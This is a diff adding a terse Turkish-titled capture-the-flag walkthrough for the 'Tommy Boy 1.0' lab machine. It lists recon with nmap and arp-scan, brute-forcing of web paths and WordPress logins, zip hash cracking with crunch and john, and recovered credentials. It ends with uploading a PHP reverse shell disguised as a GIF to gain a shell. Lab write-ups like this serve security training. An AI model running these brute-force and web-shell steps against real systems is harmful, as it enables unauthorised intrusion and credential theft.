@@ -1,0 +1,34 @@
+TOMMYBOY 1.0 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.138 bulundu.
+2 - nmap -sT -A -p- 192.168.2.138
+3 - http://192.168.2.138/flag-numero-uno.txt -> B34rcl4ws
+4 - http://192.168.2.138/prehistoricforest/
+5 - http://192.168.2.138/prehistoricforest/thisisthesecondflagyayyou.txt -> Z4l1nsky
+6 - http://192.168.2.138/prehistoricforest/richard
+7 - exiftool shockedrichard.jpg -> User Comment: ce154b5a8e59c89732bc25d6a2e6b90b (MD5) : spanky
+8 - ftp 192.168.2.138 65534, nickburns:nickburns
+9 - Burp Suite -> Intruder 
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
+GET /NickIzL33t/§a§.html -> rockyou.txt
+10 - http://192.168.2.138:8008/NickIzL33t/fallon1.html
+11 - http://192.168.2.138:8008/NickIzL33t/hint.txt
+12 - http://192.168.2.138:8008/NickIzL33t/flagtres.txt -> TinyHead
+13 - http://192.168.2.138:8008/NickIzL33t/t0mspassw0rdz.zip
+14 - view-source:http://192.168.2.138:8008/NickIzL33t/fallon1.html
+15 - view-source:http://192.168.2.138:8008/NickIzL33t/P4TCH_4D4MS/
+16 - crunch 13 13 -t bev,%%@@^1995 -o tommyboy_crunch.txt
+17 - zip2john t0mspassw0rdz.zip > hash
+18 - john hash -w=tommyboy_crunch.txt,  bevH00tr$1995
+19 - wpscan --url http://192.168.2.138/prehistoricforest/ -e u, tommy, richard, tom, michelle
+20 - wpscan --url http://192.168.2.138/prehistoricforest/ -e p --usernames tom --passwords /usr/share/wordlists/rockyou.txt 
+21 - tom : tomtom1 -> Login -> Posts -> My "ess ess eight" password -> bigtommysenior:fatguyinalittlecoat1938!!
+22 - ssh bigtommysenior@192.168.2.138
+23 - cat el-flag-numero-quatro.txt -> EditButton
+24 - scp bigtommysenior@192.168.2.138:/home/bigtommysenior/callahanbak.bak /home/alper/Downloads
+25 - cp /usr/share/webshell/php/php-reverse-shell.php .
+26 - First Line -> GIF98, cp php-reverse-shell.php php-gif-shell.php.gif
+27 - upload, ssh : cp php-gif-shell.php.gif php-gif-shell.php  
+28 - http://192.168.2.138:8008/NickIzL33t/P4TCH_4D4MS/uploads/php-gif-shell.php
+29 - ls -la, cat .5.txt -> Buttcrack
+30 - ZIP PASSWORD = B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
+31 - cat THE-END.txt
